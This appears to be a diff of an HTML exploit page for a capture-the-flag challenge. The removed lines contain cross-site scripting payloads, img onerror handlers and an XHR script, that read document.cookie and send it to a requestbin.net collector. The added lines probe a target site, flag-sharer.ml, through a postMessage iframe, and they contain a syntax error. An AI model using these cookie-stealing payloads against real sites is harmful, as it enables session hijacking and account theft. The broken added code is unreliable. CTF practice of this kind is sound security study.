@@ -7,32 +7,20 @@
 
 <h1>ctf</h1>
 <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
-<img src =asdf onerror="$.get('http://requestbin.net/r/1iksjrn1'+ '?cookie='+ btoa(document.cookie))">
-<img src=x onerror=this.src='http://requestbin.net/r/1iksjrn1?cookie='+ btoa(document.cookie)>
-<script type="text/javascript">
+<script>
+window.addEventListener("message", function(message){
+	alert(message.data);
+});
 </script>
+<script>
+function test() {
+	var frame= document.getElementById("frame");
+	frame.contentWindow.postMessage("test","*");
 
+});
+</script>
+<iframe onload="test()" src="https://flag-sharer.ml/gifts" id='frame'> </iframe>
 
-
-</iframe>
-
-    <script>
-        $('#frame1').load(function() { 
-        var url='http://requestbin.net/r/1iksjrn1?c=' + document.getElementById("frame1").contentDocument.cookie;
-        console.log("payload = " + url);
-        document.getElementById("frame1").src = url;
-        var xhr = new XMLHttpRequest()
-                xhr.open('GET', url, true)
-                xhr.withCredentials = true
-                xhr.onreadystatechange = function() {
-                  if (xhr.readyState === 2) {
-                      console.log("finished");
-                  }
-                }
-                xhr.setRequestHeader('Content-Type', 'application/json')
-
-        })
-    </script>
 </body>
 </html>
 
